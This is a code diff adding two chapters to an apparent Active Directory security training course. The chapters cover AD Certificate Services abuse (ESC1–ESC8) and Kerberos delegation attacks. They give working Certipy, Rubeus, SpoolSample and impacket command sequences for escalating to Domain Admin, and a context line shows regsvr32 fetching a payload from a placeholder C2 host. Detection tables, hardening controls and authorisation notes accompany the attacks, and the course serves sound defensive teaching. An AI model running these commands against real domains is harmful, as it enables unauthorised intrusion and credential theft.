@@ -682,6 +682,148 @@ regsvr32 /u /s /i:http://C2_IP/payload.sct scrobj.dll`}</Pre>
       'AMSI bypass is essential before running offensive PowerShell — it disables script content inspection',
     ]
   },
+
+  {
+    id: 'ad-ch9',
+    title: 'AD Certificate Services Abuse (ESC1–ESC8)',
+    difficulty: 'ADVANCED',
+    readTime: '24 min',
+    labLink: '/modules/active-directory/lab',
+    content: (
+      <div>
+        <P>Active Directory Certificate Services (AD CS) is Microsoft's PKI. Most enterprises run it to issue certificates for smart cards, VPNs, web servers and code signing. It is also, in a misconfigured domain, one of the most reliable paths from a low-privileged user straight to Domain Admin — and because it abuses legitimate PKI flows, it often sails past detection. The research that named these flaws (SpecterOps, "Certified Pre-Owned") catalogued them as ESC1 through ESC8.</P>
+
+        <H>Why Certificates = Credentials</H>
+        <P>A certificate that permits Client Authentication is, effectively, a password that lasts as long as the certificate is valid (often a year) and keeps working through password resets. If an attacker can make the CA issue a cert where they control the subject identity, they can authenticate as anyone — including a Domain Admin or the Domain Controller computer account.</P>
+
+        <H>The ESC Taxonomy</H>
+        <Table headers={['ID', 'MISCONFIGURATION', 'IMPACT']} rows={[
+          ['ESC1', 'Template allows requester-supplied Subject Alternative Name (SAN) + Client Auth EKU, low-priv enrollment', 'Request a cert as any user → authenticate as Domain Admin'],
+          ['ESC2', 'Template has "Any Purpose" or no EKU', 'Cert usable for any purpose, including auth-as-anyone'],
+          ['ESC3', 'Enrollment Agent template exposed', 'Request agent cert, then enroll on behalf of other users'],
+          ['ESC4', 'Attacker has write/owner rights over a template', 'Rewrite the template into a vulnerable one, then abuse it'],
+          ['ESC5', 'Weak ACLs on CA objects / PKI container', 'Tamper with CA configuration or templates domain-wide'],
+          ['ESC6', 'CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set', 'Any template effectively becomes ESC1 (SAN injection)'],
+          ['ESC7', 'Attacker holds ManageCA / ManageCertificates rights', 'Approve own requests, enable SAN flag, issue arbitrary certs'],
+          ['ESC8', 'CA web enrollment endpoint allows NTLM relay', 'Relay a DC machine account to the CA → cert for the DC'],
+        ]} />
+
+        <H>Finding Vulnerable Templates (Certipy)</H>
+        <Pre label="// ENUMERATE AD CS FOR ESC FINDINGS">{`# Certipy reads every certificate template and CA ACL and flags the ESCs for you
+certipy find -u operator@corp.local -p 'Passw0rd!' -dc-ip 10.10.10.10 -vulnerable -stdout
+
+# Output marks templates like:
+#   [!] Vulnerabilities
+#       ESC1 : 'CORP.LOCAL\\Domain Users' can enroll, enrollee supplies subject and
+#              template allows client authentication`}</Pre>
+
+        <H>Exploiting ESC1 — Become Domain Admin</H>
+        <Pre label="// REQUEST A CERT IMPERSONATING A DOMAIN ADMIN">{`# 1. Request a certificate from the vulnerable template, supplying the SAN we want to be:
+certipy req -u operator@corp.local -p 'Passw0rd!' -dc-ip 10.10.10.10 \\
+  -ca CORP-CA -template VulnTemplate -upn administrator@corp.local
+
+#   -> saves administrator.pfx
+
+# 2. Authenticate with the certificate to get the target's NT hash + a Kerberos TGT:
+certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
+
+#   -> [*] Got hash for 'administrator@corp.local': aad3b4...:value
+#   -> [*] Saved credential cache to 'administrator.ccache'
+
+# 3. Use the TGT or the hash — you are now Domain Admin.`}</Pre>
+
+        <Note label="ATTACK → DEFEND">On the lab range this is a clean, repeatable kill chain. Now flip it: this is exactly why a defender audits every template with the Client Authentication EKU, removes "Supply in request" for the subject, pulls the EDITF_ATTRIBUTESUBJECTALTNAME2 flag, and tiers CA administration. You cannot defend a PKI flaw you have never watched an attacker walk through.</Note>
+
+        <H>Detection & Hardening</H>
+        <Table headers={['SIGNAL / CONTROL', 'WHERE', 'WHAT IT CATCHES']} rows={[
+          ['Event ID 4886/4887 (cert requested/issued)', 'CA security log', 'A SAN that does not match the requester = ESC1/ESC6 abuse'],
+          ['Certificate with mismatched SAN at logon', 'DC Kerberos (4768 with cert info)', 'Auth using a forged-identity certificate'],
+          ['Remove "Supply in request" for subject', 'Template config', 'Closes ESC1 at the source'],
+          ['Disable EDITF_ATTRIBUTESUBJECTALTNAME2', 'certutil -setreg on CA', 'Closes the domain-wide ESC6 escalation'],
+          ['Enforce Extended Protection / require HTTPS', 'CA web enrollment', 'Breaks the ESC8 NTLM relay'],
+          ['Tier-0 the CA and PKI admins', 'AD delegation model', 'Removes ESC4/ESC5/ESC7 write-path abuse'],
+        ]} />
+
+        <Note label="LEGAL + ETHICS">Every command here is for a lab you own or an engagement you are contracted and authorised to test. The point of learning the attacker's exact steps is to detect and close them — not to run them anywhere you lack written permission.</Note>
+      </div>
+    ),
+    takeaways: [
+      'A client-auth certificate is a long-lived credential that survives password resets — issuing one as another user is full impersonation',
+      'ESC1 is the classic: a low-priv user enrolls in a template that lets them supply their own SAN and has the Client Authentication EKU',
+      'Certipy find -vulnerable enumerates the entire ESC surface; certipy req/auth weaponises it in two commands',
+      'Defence is template hygiene: no requester-supplied subjects, no stray EKUs, no EDITF_ATTRIBUTESUBJECTALTNAME2, and a tiered CA',
+    ]
+  },
+
+  {
+    id: 'ad-ch10',
+    title: 'Delegation Attacks (Unconstrained, Constrained, RBCD)',
+    difficulty: 'ADVANCED',
+    readTime: '22 min',
+    labLink: '/modules/active-directory/lab',
+    content: (
+      <div>
+        <P>Kerberos delegation lets a service act on behalf of a user — the classic example is a web server that must reach a database as the logged-in user. Useful, and dangerous: every delegation setting is a place where "act as someone else" is a configuration, not an exploit. Three flavours exist, and each has an abuse path.</P>
+
+        <H>1. Unconstrained Delegation</H>
+        <P>A machine trusted for unconstrained delegation caches the Kerberos TGT of every user who authenticates to it. Compromise that host and you can extract those TGTs — including, if you can coerce it, a Domain Controller's.</P>
+        <Pre label="// HARVEST TGTS FROM AN UNCONSTRAINED HOST">{`# Find hosts with unconstrained delegation:
+Get-DomainComputer -Unconstrained | select name
+
+# On the compromised host, monitor for and extract cached tickets:
+Rubeus.exe monitor /interval:5 /nowrap
+
+# Coerce a Domain Controller to authenticate to you (PrinterBug / PetitPotam):
+SpoolSample.exe DC01 ATTACKERHOST
+#   -> DC01's TGT lands in your monitor -> Pass-the-Ticket as the DC -> DCSync`}</Pre>
+
+        <H>2. Constrained Delegation</H>
+        <P>An account configured with constrained delegation can request tickets to a specific set of services "on behalf of" any user via S4U2Self + S4U2Proxy. If you own that account, you can impersonate a Domain Admin to those services.</P>
+        <Pre label="// ABUSE CONSTRAINED DELEGATION (S4U)">{`# Find accounts with constrained delegation (msDS-AllowedToDelegateTo set):
+Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
+Get-DomainComputer -TrustedToAuth | select name, msds-allowedtodelegateto
+
+# With the delegating account's hash, impersonate 'administrator' to its allowed SPN:
+Rubeus.exe s4u /user:websvc /rc4:HASH /impersonateuser:administrator \\
+  /msdsspn:cifs/fileserver.corp.local /ptt
+#   -> you now hold a ticket to CIFS on the file server AS the administrator`}</Pre>
+
+        <H>3. Resource-Based Constrained Delegation (RBCD)</H>
+        <P>The modern favourite. If you can write the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on a target computer — which only needs GenericWrite/GenericAll over that object — you point it at a machine account you control and impersonate anyone to it.</P>
+        <Pre label="// RBCD TAKEOVER OF A TARGET COMPUTER">{`# 1. You need an account with an SPN. Create a computer account (default quota = 10):
+#    (addcomputer via impacket)
+addcomputer.py corp.local/operator:'Passw0rd!' -computer-name 'EVIL$' -computer-pass 'Evil123!'
+
+# 2. Set RBCD on the target so EVIL$ may act on its behalf (you have GenericWrite on TARGET$):
+rbcd.py corp.local/operator:'Passw0rd!' -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write
+
+# 3. Get a ticket impersonating administrator to the target:
+getST.py corp.local/'EVIL$':'Evil123!' -spn cifs/target.corp.local -impersonate administrator
+
+#   -> administrator ticket for TARGET -> psexec/secretsdump as DA on that host`}</Pre>
+
+        <Note label="ATTACK → DEFEND">RBCD is powerful because the prerequisite — a single writable attribute — is so ordinary. That is the lesson for the blue side: delegation abuse is an ACL problem wearing a Kerberos costume. Hunt the write rights, not just the tickets.</Note>
+
+        <H>Detection & Hardening</H>
+        <Table headers={['CONTROL', 'EFFECT']} rows={[
+          ['Set "Account is sensitive and cannot be delegated" on Tier-0 users', 'Protected admins can never be impersonated via any delegation'],
+          ['Add admins to the Protected Users group', 'Disables delegation + weak crypto for those accounts'],
+          ['Remove unconstrained delegation; use RBCD/constrained only', 'Eliminates DC-TGT harvesting via coercion'],
+          ['Set ms-DS-MachineAccountQuota to 0', 'Stops low-priv users creating the EVIL$ machine RBCD needs'],
+          ['Audit writes to msDS-AllowedToActOnBehalfOfOtherIdentity (4742)', 'Catches RBCD being planted in real time'],
+          ['Patch + mitigate coercion (PetitPotam/PrinterBug)', 'Removes the forced-auth trigger for unconstrained abuse'],
+        ]} />
+
+        <Note label="BEGINNER NOTE">Delegation is "I let this service pretend to be you so it can fetch your data elsewhere." Every attack here is a way to make the service pretend to be an admin instead. The defences all say the same thing in different words: never let a Tier-0 admin be pretended-to, and watch who can edit the "allowed to pretend" list.</Note>
+      </div>
+    ),
+    takeaways: [
+      'Unconstrained delegation caches full TGTs — compromise + coercion (PetitPotam) hands you a DC ticket',
+      'Constrained delegation (S4U) lets a controlled account impersonate any user to its allowed services',
+      'RBCD is an ACL problem: GenericWrite on a computer object + a machine account you control = impersonate anyone to it',
+      'Defence: Protected Users / sensitive flag for Tier-0, machine quota 0, kill unconstrained, and audit the delegation attributes',
+    ]
+  },
 ]
 
 export default function ActiveDirectoryModule() {
